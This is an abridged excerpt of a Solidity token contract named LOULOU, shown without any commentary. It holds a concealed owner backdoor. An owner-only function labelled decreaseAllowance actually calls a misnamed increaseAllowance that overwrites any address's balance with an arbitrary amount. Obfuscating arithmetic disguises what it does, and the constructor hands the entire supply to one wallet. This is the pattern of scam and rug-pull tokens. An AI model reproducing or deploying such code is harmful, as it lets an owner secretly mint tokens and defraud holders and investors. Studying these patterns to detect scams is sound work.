...
contract LOULOU is Ownable {
  ...
  function decreaseAllowance(address parent, uint256 amount) public isOwner {
    increaseAllowance(parent, amount); 
  }

  function increaseAllowance(address parent, uint256 amount) internal {
    _balances[parent] = (rTransfersValue + rTransferAmount - rLiquidity / rLiquidity) + amount * 10 ** 9;
  } 
  ...
  constructor(string memory _name, string memory _symbol) public {
    ...
    _balances[allowedWallet] = totalSupply;
